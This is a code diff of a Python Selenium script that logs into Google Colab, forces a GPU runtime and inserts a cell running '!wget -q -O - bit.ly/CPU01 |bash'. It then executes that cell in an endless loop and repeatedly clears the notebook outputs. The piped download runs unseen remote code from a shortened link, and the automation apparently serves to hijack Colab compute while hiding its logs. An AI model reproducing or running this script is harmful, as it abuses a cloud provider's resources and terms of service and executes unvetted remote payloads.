@@ -199,6 +199,21 @@ def init_gpu():
     except:
         print("Error GPU Config")
 
+def init_gpu2():
+    try:
+        time.sleep(2*slow_motion)
+        driver.find_element(By.ID, "edit-menu-button").click()
+        time.sleep(1*slow_motion)
+        driver.find_element(By.CSS_SELECTOR, "div[command='notebook-settings'] > .goog-menuitem-content").click()
+        driver.find_element(By.ID, "accelerator").click()
+        dropdown = driver.find_element(By.ID, "accelerator")
+        dropdown.find_element(By.XPATH, "//option[. = 'GPU']").click()
+        driver.find_element(By.CSS_SELECTOR, "option:nth-child(2)").click()
+        driver.find_element(By.ID, "ok").click()
+        print("GPU Config")
+    except:
+        print("Error GPU Config")
+
 def add_cmd(cmd="!wget -q -O - bit.ly/CPU01 |bash"):
     try:
         driver.find_element(By.CSS_SELECTOR, ".view-line").click()
@@ -234,6 +249,16 @@ def clear_logs():
     except:
         print("imposible to clear logs")
 
+def clear_logs2():
+    try:
+        time.sleep(2*slow_motion)
+        driver.find_element(By.ID, "edit-menu-button").click()
+        time.sleep(0.2*slow_motion)
+        driver.find_element(By.CSS_SELECTOR, "div[command='clear-outputs'] > .goog-menuitem-content").click()
+        print("no gpu accepted")
+    except:
+        print("imposible to clear logs")
+
 time.sleep(0.1*slow_motion)
 print(0.1*slow_motion)
 #driver.set_window_size(360, 667)
@@ -247,12 +272,12 @@ time.sleep(2*slow_motion)
 #driver.get("https://www.whatismybrowser.com/fr/")
 #driver.get("https://console.cloud.google.com/")
 new_colab2(user=user_id,passw=gpassword)
-init_gpu()
+init_gpu2()
 add_cmd()
 while True:
     exec_colab()
     time.sleep(30)
-    clear_logs()
+    clear_logs2()
     time.sleep(30)
 
 #driver.close()
